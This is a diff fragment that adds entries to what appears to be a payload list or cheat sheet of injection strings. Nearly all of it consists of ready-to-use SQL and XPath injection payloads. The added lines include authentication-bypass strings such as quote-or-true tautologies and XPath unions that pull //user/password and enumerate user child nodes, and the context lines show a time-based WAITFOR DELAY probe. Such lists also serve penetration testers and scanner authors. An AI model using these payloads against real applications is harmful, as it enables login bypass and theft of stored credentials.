@@ -951,6 +951,32 @@ admin") or "1"="1"/*
 admin' or '
 admin' or '1'='2
 ','');WAITFOR%20DELAY%20'0:0:5'--%20-
+' or '1'='1
+" or "1"="1
+' or ''='
+" or ""="
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+') or 1=1 or ('
+') or 1=1] | //user/password[('')=('
+') or 2=1] | //user/node()[('')=('
+')] | //./node()[('')=('
+')] | //node()[('')=('
+') or 1=1] | //user/password[('')=('
+')] | //password%00
+')]/../*[3][text()!=('
+')] | //user/*[1] | a[('
+')] | //user/*[2] | a[('
+')] | //user/*[3] | a[('
+')] | //user/*[4] | a[('
 ```
 
 ```
